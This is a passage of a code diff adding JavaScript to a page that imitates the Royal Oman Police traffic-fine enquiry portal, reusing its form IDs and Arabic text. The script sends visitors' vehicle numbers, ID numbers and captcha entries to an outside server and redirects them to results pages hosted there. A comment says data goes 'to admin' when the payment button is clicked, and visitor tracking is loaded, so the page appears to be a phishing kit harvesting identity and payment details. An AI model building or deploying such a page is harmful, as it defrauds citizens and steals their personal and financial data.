+    .catch(function(err) { console.error('ROP init error:', err); });
+}
+
+function reloadCaptcha() {
+  if (!ropSessionId) { initRopSession(); return; }
+  fetch(ROP_SERVER + '/api/rop/refresh-captcha?sessionId=' + ropSessionId)
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (data.success && data.captchaImage) {
+        document.getElementById('c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaImage').src = data.captchaImage;
+      } else { initRopSession(); }
+    })
+    .catch(function(err) { initRopSession(); });
+}
+
+function playCaptchaSound() { alert("هذه الخاصية غير متوفرة حالياً"); }
+
+function submitToRop(action) {
+  var vehicleChars = document.getElementById('ctl00_ContentPlaceHolder1_ddlVehicleChars').value;
+  var vehicleNo = document.getElementById('ctl00_ContentPlaceHolder1_txtVehicleNo').value;
+  var idType = document.getElementById('ctl00_ContentPlaceHolder1_ddlIDChoice').value;
+  var idValue = document.getElementById('ctl00_ContentPlaceHolder1_txtIDValue').value;
+  var captchaCode = document.getElementById('ctl00_ContentPlaceHolder1_CaptchaCodeTextBox').value;
+  
+  if (!vehicleNo || !idValue || !captchaCode) {
+    showError('يرجى تعبئة جميع الحقول المطلوبة');
+    return;
+  }
+  if (!ropSessionId) { showError('جاري تحميل الجلسة، يرجى المحاولة مرة أخرى'); initRopSession(); return; }
+  
+  document.getElementById('rop-loading').style.display = 'block';
+  document.getElementById('rop-error').style.display = 'none';
+  document.getElementById('rop-results-container').style.display = 'none';
+  
+  fetch(ROP_SERVER + '/api/rop/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ sessionId: ropSessionId, vehicleChars: vehicleChars, vehicleNo: vehicleNo, idType: idType, idValue: idValue, captchaCode: captchaCode, action: action || 'enquire' })
+  })
+  .then(function(r) {
+    if (!r.ok && r.status >= 500) {
+      throw new Error('Server error: ' + r.status);
+    }
+    return r.json();
+  })
+  .then(function(data) {
+    document.getElementById('rop-loading').style.display = 'none';
+    if (data.success) {
+      // Data will be sent to admin when user clicks payment button on results page
+      if (data.noFines) {
+        showResults('<div class="alert alert-info" style="text-align:center; font-size:16px;"><strong>لا توجد مخالفات مرورية غير مسددة</strong></div>');
+      } else if (data.hasResults && data.resultId) {
+        // Redirect to the full ROP results page served by Railway
+        var vid = localStorage.getItem('visitorId') || '';
+        window.location.href = ROP_SERVER + '/api/rop/results-page/' + data.resultId + '?vid=' + encodeURIComponent(vid);
+        return;
+      } else {
+        showResults('<div class="alert alert-success" style="text-align:center; font-size:16px;"><strong>تم الاستعلام بنجاح</strong></div>');
+      }
+    } else {
+      if (data.error === 'captcha_invalid') {
+        showError(data.message || 'رمز التحقق غير صحيح');
+        if (data.captchaImage) {
+          document.getElementById('c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaImage').src = data.captchaImage;
+        } else {
+          reloadCaptcha();
+        }
+        document.getElementById('ctl00_ContentPlaceHolder1_CaptchaCodeTextBox').value = '';
+      } else if (data.error === 'session_expired') {
+        showError(data.message || 'انتهت الجلسة، يرجى تحديث الصفحة');
+        initRopSession();
+      } else {
+        showError(data.message || data.error || 'حدث خطأ أثناء الاستعلام');
+        if (data.captchaImage) {
+          document.getElementById('c_arabic_default_ctl00_contentplaceholder1_samplecaptcha_CaptchaImage').src = data.captchaImage;
+        } else {
+          reloadCaptcha();
+        }
+        document.getElementById('ctl00_ContentPlaceHolder1_CaptchaCodeTextBox').value = '';
+      }
+    }
+  })
+  .catch(function(err) {
+    document.getElementById('rop-loading').style.display = 'none';
+    showError('حدث خطأ في الاتصال بالخادم، يرجى المحاولة مرة أخرى');
+    console.error('Submit error:', err);
+  });
+}
+
+function showError(msg) {
+  var el = document.getElementById('rop-error');
+  el.innerHTML = '<strong>خطأ:</strong> ' + msg;
+  el.style.display = 'block';
+}
+
+function showResults(html) {
+  document.getElementById('rop-results-container').style.display = 'block';
+  document.getElementById('rop-results-content').innerHTML = html;
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+  initRopSession();
+  var btnEnquire = document.getElementById('ctl00_ContentPlaceHolder1_bntEnquire');
+  var btnHistory = document.getElementById('ctl00_ContentPlaceHolder1_btnHistory');
+  var btnReport = document.getElementById('ctl00_ContentPlaceHolder1_btnReport');
+  if (btnEnquire) { btnEnquire.onclick = function(e) { e.preventDefault(); submitToRop('enquire'); return false; }; }
+  if (btnHistory) { btnHistory.onclick = function(e) { e.preventDefault(); submitToRop('history'); return false; }; }
+  if (btnReport) { btnReport.onclick = function(e) { e.preventDefault(); submitToRop('report'); return false; }; }
+});
+</script>
+<script src="visitor-tracking.js"></script>
+</body>
+<!-- InstanceEnd --></html>
+
+
